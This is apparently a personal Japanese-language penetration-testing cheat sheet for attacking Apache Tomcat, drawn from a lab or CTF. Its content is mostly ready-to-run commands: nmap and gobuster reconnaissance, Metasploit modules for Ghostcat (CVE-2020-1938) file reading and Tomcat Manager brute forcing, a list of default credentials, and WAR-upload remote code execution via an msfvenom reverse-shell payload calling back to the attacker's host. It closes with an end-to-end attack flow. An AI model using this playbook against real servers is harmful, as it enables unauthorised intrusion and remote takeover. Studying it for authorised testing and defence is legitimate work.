---
tags: [hacking, skill, cheatsheet]
category: Webアタック / Exploitation
difficulty: Easy
learned_from: bsidesgtthompson
date: 2026-03-28
---

# Apache Tomcat 攻撃チートシート

## 概要

Apache Tomcat の設定ミスや脆弱性を突いた攻撃手法まとめ。
AJP13外部公開・デフォルト認証情報・WAR Upload RCE が主な攻撃ベクター。

---

## 使いどころ

- ポートスキャンで **8080 (HTTP)** または **8009 (AJP13)** が開いている
- Tomcat のバージョンが古い（8.5.50以前、9.0.30以前）

---

## 1. 情報収集

```bash
# バージョン確認（nmapで自動取得）
nmap -sC -sV -p 8080,8009 <TARGET_IP>

# エラーページからバージョン確認
curl http://<TARGET_IP>:8080/NONEXISTENT

# デプロイ済みアプリ列挙
gobuster dir -u http://<TARGET_IP>:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

---

## 2. Ghostcat (CVE-2020-1938)

### 対象バージョン
| バージョン | 状態 |
|-----------|------|
| Tomcat 6.x / 7.x | 脆弱 |
| Tomcat 8.x ～ 8.5.50 | 脆弱 |
| **Tomcat 8.5.51+** | 修正済み |
| Tomcat 9.x ～ 9.0.30 | 脆弱 |

### 条件
- AJP13 (8009) が外部公開されている
- カスタムアプリがデプロイされており、設定ファイルに認証情報が含まれている

### Metasploit

```bash
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS <TARGET_IP>
set RPORT 8009
# 読み取るファイルを変更する場合
set FILENAME /WEB-INF/web.xml
run
```

### 注意
デフォルトTomcatのみの場合は `web.xml` に認証情報がないため攻撃は成立しない。

---

## 3. Tomcat Manager 認証情報

### デフォルト認証情報チェック

```bash
# 認証試行
curl -u "tomcat:s3cret" http://<TARGET_IP>:8080/manager/html -o /dev/null -w "%{http_code}"

# 401ページを確認（ヒントが記載されていることがある）
curl http://<TARGET_IP>:8080/manager/html
```

### よくある認証情報
| ユーザー名 | パスワード |
|-----------|----------|
| tomcat | tomcat |
| tomcat | s3cret |
| admin | admin |
| admin | password |

### Metasploit ブルートフォース

```bash
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <TARGET_IP>
set RPORT 8080
set STOP_ON_SUCCESS true
run
```

---

## 4. WAR Upload RCE

### WAR ファイルとは

Java Web アプリのパッケージ形式。
Tomcat Manager からデプロイすると即座に実行される → RCE。

### 方法1: msfvenom で手動生成

```bash
# WAR ファイル生成
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<自分のIP> LPORT=4444 -f war -o shell.war

# Tomcat Manager GUI からアップロード後、アクセスしてシェル起動
curl http://<TARGET_IP>:8080/shell/
```

### 方法2: Metasploit で自動化（推奨）

```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <TARGET_IP>
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
set LHOST <自分のIP>
set LPORT 4444
set PAYLOAD java/shell_reverse_tcp
run
```

---

## 5. 典型的な攻撃フロー

```
nmap → 8009(AJP13) + 8080(Tomcat) 確認
    ↓
Ghostcat で設定ファイル読み取り試行
    ↓ 認証情報なし or 失敗
401ページ確認 / ブルートフォース
    ↓ 認証情報取得
Tomcat Manager ログイン
    ↓
WAR Upload → RCE → シェル取得
```

---

## ハマったポイント・注意点

- Ghostcat は WEB-INF 内のファイルのみ読み取り可能（パストラバーサル不可）
- `/manager/text/` API は `manager-script` ロールが必要（`manager-gui` では403）
- Metasploit の `tomcat_mgr_login` の辞書に `s3cret` が含まれない場合がある → 手動確認も忘れずに
- Java Meterpreter は `stdapi` が自動ロードされないことがある → `java/shell_reverse_tcp` を使う方が安定

---

## 参考リンク

- [Ghostcat CVE-2020-1938](https://www.exploit-db.com/exploits/48143)
- [HackTricks - Tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)

## 関連スキル

- [[Skills/Linux-PrivEsc]]
- [[Tools/Metasploit]]
